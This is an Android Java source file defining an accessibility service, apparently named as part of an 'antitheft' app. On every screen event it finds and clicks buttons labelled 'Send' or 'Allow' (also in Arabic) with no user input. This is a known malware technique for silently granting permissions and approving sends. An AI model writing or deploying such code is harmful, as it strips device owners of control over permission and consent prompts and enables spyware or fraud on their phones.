package com.antitheft.droidguard;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class AutoConfirmService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        boolean clicked = clickButtonByText(root, "إرسال") || 
                          clickButtonByText(root, "Send") || 
                          clickButtonByText(root, "السماح") || 
                          clickButtonByText(root, "Allow");

        root.recycle();
    }

    private boolean clickButtonByText(AccessibilityNodeInfo root, String text) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo node : nodes) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                } else {
                    AccessibilityNodeInfo parent = node.getParent();
                    while (parent != null) {
                        if (parent.isClickable()) {
                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            parent.recycle();
                            return true;
                        }
                        AccessibilityNodeInfo oldParent = parent;
                        parent = parent.getParent();
                        oldParent.recycle();
                    }
                }
            }
        }
        return false;
    }

    @Override
    public void onInterrupt() {}
}
